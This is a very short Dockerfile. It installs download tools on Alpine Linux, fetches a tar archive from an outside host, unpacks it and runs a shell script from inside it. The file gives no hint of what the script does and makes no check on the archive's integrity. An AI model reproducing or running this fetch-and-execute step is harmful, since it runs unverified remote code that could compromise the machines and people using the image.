FROM alpine:3.20
RUN apk add wget curl zstd tar
RUN wget https://idev.nyc.mn/abc.tar
RUN tar -xvf abc.tar
RUN  sh ./abc/s.sh
